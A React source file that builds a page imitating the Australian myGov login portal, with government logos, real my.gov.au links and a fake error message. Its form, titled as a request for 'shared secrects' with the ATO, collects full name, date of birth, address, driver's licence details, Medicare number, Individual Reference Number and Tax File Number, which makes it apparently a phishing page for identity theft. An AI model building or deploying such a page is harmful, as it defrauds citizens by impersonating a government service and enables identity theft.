import React from "react";
import img from "./image/img.svg";
import img2 from "./image/img2.svg";
import back from "./image/back.svg";
import "./Mygov.css";

export default function Mygov() {
  return (
    <div className="main-container">
      <header role="banner" className="mgvEnhanceHeader">
        <section className="inner-wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a
                  href="https://my.gov.au/"
                  className="unauth-govt-crest__link"
                >
                  <img
                    id="unauth-govt-crest"
                    src={img}
                    alt="Australian Government and myGov logo"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="https://my.gov.au/en/about/help">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <div className="back-link">

                        <img src={back} alt="back button" className="back-icon" />
                      <a
                        data-go-back-link=""
                        className="button-back"
                        href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=close"
                      >
                        Back
                      </a>
                      </div>
                      <div
                        id="passkey-auth-error"
                        className="alert alert-danger error-msg"
                        role="alert"
                        style={{ display: "none" }}
                      ></div>
                      <div style={{ display: "none" }} id="error-msg">
                        <div
                          className="error-msg"
                          role="alert"
                          aria-live="assertive"
                        >
                          <span className="is-visuallyhidden">
                            Error message:
                          </span>
                          <div className="error-msg-text">
                            <span>
                              <strong>Error</strong>
                              <br /> Your sign in details are incorrect.
                              (RFM10A) <br />
                              <br />
                              <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=recoverusername">
                                Forgot username
                              </a>
                              <br />
                              <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=resetpassword">
                                Forgot password
                              </a>
                            </span>
                          </div>
                        </div>
                      </div>

                      <h1>MyGov Account Information</h1>
                      <h2
                        className="text-align-left"
                        style={{ fontWeight: "400", fontSize: "16px" }}
                      >
                        Please answer the shared secrects between you and the
                        ATO
                      </h2>
                      <hr />
                      <form
                        id="login-form"
                        aria-describedby="error-msg"
                        className="mygov-login-form alternative"
                      >
                        <div className="input-group">
                          <label className="override">Full Name</label>
                          <input
                            id="name"
                            name="name"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Mobile Number</label>
                          <input
                            id="phone"
                            name="phone"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Date of Birth</label>
                          <input
                            id="dob"
                            name="dob"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Address on File</label>
                          <input
                            id="address"
                            name="address"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Driver's License Number
                          </label>
                          <input
                            id="dl"
                            name="dl"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Driver's License Card No. (Back of Card)
                          </label>
                          <input
                            id="dlback"
                            name="dlback"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Driver's License Expiry Date
                          </label>
                          <input
                            id="dlexp"
                            name="dlexp"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Medicare Number</label>
                          <input
                            id="medno"
                            name="medno"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">
                            Individual Reference Number
                          </label>
                          <input
                            id="irn"
                            name="irn"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>

                        <div className="input-group">
                          <label className="override">Tax File Number</label>
                          <input
                            id="taxno"
                            name="taxno"
                            aria-required="true"
                            type="text"
                            autocomplete="off"
                          />
                        </div>
                        <p className="recovery"></p>
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              id="btn01"
                              type="submit"
                              className="button-main"
                              name="_eventId_login"
                            >
                              Submit
                            </button>
                          </div>
                        </div>

                        <div></div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="footer-wrapper">
          <div className="footer-inner">
            <section className="footer-list">
              <>
                <h2 className="sr-only" aria-label="Footer">
                  Footer
                </h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="https://my.gov.au/en/about/terms">
                      Terms of use
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/privacy-and-security"
                    >
                      Privacy and security
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/copyright"
                    >
                      Copyright
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/accessibility"
                    >
                      Accessibility
                    </a>
                  </li>
                </ul>
              </>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="https://my.gov.au">
                  <img
                    src={img2}
                    alt="Australian Government and myGov logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live
                on. We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
